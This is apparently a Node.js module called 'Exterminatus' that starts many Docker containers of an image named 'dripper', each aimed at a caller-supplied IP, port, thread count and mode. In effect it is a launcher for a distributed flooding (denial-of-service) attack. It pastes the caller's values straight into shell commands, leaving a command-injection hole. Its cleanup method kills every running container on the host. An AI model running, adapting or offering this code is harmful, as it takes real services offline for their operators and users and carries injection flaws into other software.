const util = require('util');
const exec = util.promisify(require('child_process').exec);

class Exterminatus {
  attack({ ip, port, mode, threads, containers }) {
    if (!containers) {
      console.error('Incorrect number of containers');
      return;
    }
    try {
      for (let i = containers; i !== 0; i--) {
        const name = `container${i}`;
        const cmd = `docker run --rm --name="${name}" alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode}`
        console.info(cmd);
        exec(cmd, {
          maxBuffer: 1024 * 1024 / containers
        }, (error, stdout, stderr) => {
          if (error) {
            console.error(error);
            return;
          }

          if(stderr) {
            console.error(stderr);
            return
          }

          console.info(stdout)
        });
      }
    } catch (err) {
      console.error(err);
    }
  }

  killContainers() {
    const cmd = `docker kill $(docker ps -q) && docker image rm -f alexmon1989/dripper`;
    console.info(cmd);
    exec(cmd, (error, stdout) => {
      if (error) {
        console.error(error);
        return;
      }

      console.info(stdout);
    });
  }
}

module.exports.default = new Exterminatus();